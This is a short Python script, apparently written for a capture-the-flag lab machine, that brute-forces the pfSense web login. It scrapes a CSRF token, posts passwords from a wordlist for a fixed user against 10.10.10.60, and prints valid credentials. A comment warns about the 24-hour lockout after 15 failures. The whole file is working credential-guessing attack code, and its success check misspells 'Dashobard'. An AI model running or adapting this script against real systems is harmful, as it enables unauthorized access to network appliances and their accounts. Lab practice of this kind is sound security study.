# Brute-force credentials of pfSense
# Don't try too many passwords as it bans you for 24 hours after 15 failed attempts

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re

re_csrf = 'csrfMagicToken = "(.*?)"'

s = requests.session()
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

lines = open('passwords.txt')
for password in lines:
    r = s.get('https://10.10.10.60/index.php', verify=False)
    csrf = re.findall(re_csrf, r.text)[0]
    login = {'__csrf_magic': csrf, 'usernamefld': 'rohit', 'passwordfld': password[:-1], 'login': 'Login'}
    r = s.post('https://10.10.10.60/index.php', data=login)
    if "Dashobard" in r.text:
        print("Valid login %s:%s" % ("rohit",password))
    else:
        print("Failed %s:%s" % ("rohit",password))
        s.cookies.clear()
